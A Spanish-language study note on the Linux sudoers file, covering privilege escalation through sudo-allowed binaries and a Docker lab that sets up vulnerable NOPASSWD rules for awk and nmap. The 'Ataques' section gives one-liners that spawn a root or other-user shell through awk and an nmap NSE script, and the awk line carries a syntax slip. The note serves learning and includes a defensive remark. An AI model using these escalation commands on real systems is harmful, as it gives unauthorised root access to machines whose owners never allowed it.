> El archivo sudoers (ubicado en /etc/sudoers) es el archivo de configuración en Linux/Unix que define qué usuarios o grupos tienen permisos para ejecutar comandos con privilegios de superusuario (root) utilizando el comando sudo. Controla la seguridad, especificando quién, dónde y qué comandos pueden ejecutarse, elevando privilegios de forma temporal y segura.

## Ataques
- Si tengo permisos para ejecutar `awk`
```
sudo -u savitar awk 'BEGIN {system{"/bin/sh"}}'
```
- Si tengo permisos para ejecutar `nmap`
```
echo 'os.execute("/bin/sh")' > /tmp/script.nse
sudo -u manolito nmap --script=/tmp/script.nse
```
- Debemos cuidar que programas permitimos ejecutar con privilegios porque pueden permitir ataques como este.
## Recurso web
- [[gtobins]]

## Laboratorio
- Armamos el contenedor
```
docker pull ubuntu:latest
docker run -dit --name serverUb ubuntu
docker exec -it serverUb bash
```
- Ponemos a punto
```
apt update
apt install nano sudo
```
- Creamos dos usuarios con sus directorios
```
cd /home
adduser -d /home/savitar -m -s /bin/bash savitar
adduser -d /home/univ -m -s /bin/bash univ
passwd savitar # para contrasenia
passwd univ
```
- Con el comando sudo podemos ver que binarios podemos ejecutar como que usuarios, osea yo savitar puedo ejecutar awk como root y etc.
- Pero antes debemos configurar como root
```
nano /etc/sudoers
# aniadimos
savitar ALL=(root) NOPASSWD: /usr/bin/awk
savitar ALL=(univ) NOPASSWD:/usr/bin/nmap
```
- Ahora como savitar puedo ver que privilegios tengo
```
su savitar
sudo -l
```
- Para ejecutar un comando como otro usuario
```
sudo -u root awk
```